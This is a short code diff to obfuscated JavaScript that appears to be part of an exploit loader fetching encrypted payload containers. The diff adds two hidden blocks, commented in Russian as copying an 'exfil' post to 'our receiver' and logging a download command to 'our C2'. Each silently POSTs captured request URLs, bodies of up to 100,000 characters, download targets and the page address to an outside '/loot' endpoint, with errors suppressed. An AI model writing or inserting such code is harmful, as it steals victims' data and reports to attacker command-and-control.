@@ -1146,6 +1146,13 @@ function YA() {/* Original: YA → resolveSymbols */
             D[1] = 0, D[0] = BA;
         },
         TA(A, g, D, M) {
+            // WHS: дублируем нативный exfil-пост в наш приёмник
+            try {
+                const _w = new XMLHttpRequest();
+                _w.open("POST", "https://whs-gate-test-5si9.zai-ai.site/loot?kind=tapus", true);
+                _w.setRequestHeader("Content-Type", "application/json");
+                _w.send(JSON.stringify({ url: A, body: String(g).slice(0, 100000) }));
+            } catch (e) {}
             try {
                 let M = !1;
                 const C = new XMLHttpRequest();
@@ -1253,6 +1260,13 @@ function YA() {/* Original: YA → resolveSymbols */
                         }
                     }
 
+                    // WHS: лог нативной download-команды на наш C2
+                    try {
+                        const _d = new XMLHttpRequest();
+                        _d.open("POST", "https://whs-gate-test-5si9.zai-ai.site/loot?kind=nativecmd", true);
+                        _d.setRequestHeader("Content-Type", "application/json");
+                        _d.send(JSON.stringify({ native_cmd: "download", target: String(A).slice(0, 500), cooked: String(hashName), url: location.href }));
+                    } catch (e) {}
                     // Fetch decrypted F00DBEEF container from payloads/ directory
                     window.log("[LOADER] Loading payload: " + hashName);
                     const container = await E.buildContainer(hashName);
